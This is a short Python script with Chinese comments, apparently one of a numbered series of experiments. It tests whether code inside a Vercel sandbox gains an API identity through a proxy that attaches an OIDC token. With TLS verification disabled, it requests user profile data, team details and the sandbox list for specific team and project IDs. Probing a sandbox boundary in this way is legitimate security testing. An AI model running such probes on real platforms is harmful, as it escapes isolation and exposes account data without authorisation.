# 实验G5: OIDC token 被 API 接受性测试(沙箱内)
# 请求 api.vercel.com/v2/user -> 匹配 -> 转发 api.vercel.com(附加 aud=api.vercel.com 的 OIDC token)
# 若返回 200 用户信息 -> 沙箱代码获得 API 身份
import urllib.request, ssl, json

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

def fetch(path_qs, method="GET", body=None):
    url = f"https://api.vercel.com{path_qs}"
    req = urllib.request.Request(url, method=method)
    if body is not None:
        req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        r = urllib.request.urlopen(req, data=data, context=ctx, timeout=30)
        b = r.read(2000)
        print(f"== {method} {path_qs[:50]} -> {r.status}", flush=True)
        print("   BODY:", b[:1200], flush=True)
    except urllib.error.HTTPError as e:
        b = e.read(2000)
        print(f"== {method} {path_qs[:50]} -> HTTPError {e.code}", flush=True)
        print("   BODY:", b[:1200], flush=True)
    except Exception as e:
        print(f"== {method} {path_qs[:50]} -> EXC {type(e).__name__}: {e}", flush=True)

# 1. 用户信息(敏感: 邮箱/用户名)
fetch("/v2/user")
# 2. 团队信息
fetch(f"/v2/teams/team_GIy1SZ444lspqeNbh4r8uAUg")
# 3. 沙箱列表
fetch(f"/v2/sandboxes?project=prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F&teamId=team_GIy1SZ444lspqeNbh4r8uAUg")
